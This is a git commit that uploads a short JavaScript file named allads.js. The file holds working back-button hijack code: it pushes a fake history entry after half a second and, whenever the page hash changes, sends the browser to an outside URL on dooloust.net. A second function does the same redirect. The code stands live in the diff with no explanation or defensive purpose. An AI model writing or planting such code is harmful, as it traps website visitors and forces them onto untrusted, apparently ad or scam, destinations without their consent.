f2ab38691b86f650e7221c33968f66017407eb05
ibal <154358741+trustportal@users.noreply.github.com>
2023-12-30 07:46:02 -0800

    Add files via upload

---
+++ allads.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="http://dooloust.net/4/4697209";
+    }
+    function goon(){
+        location.href="http://dooloust.net/4/4697209";
+    }
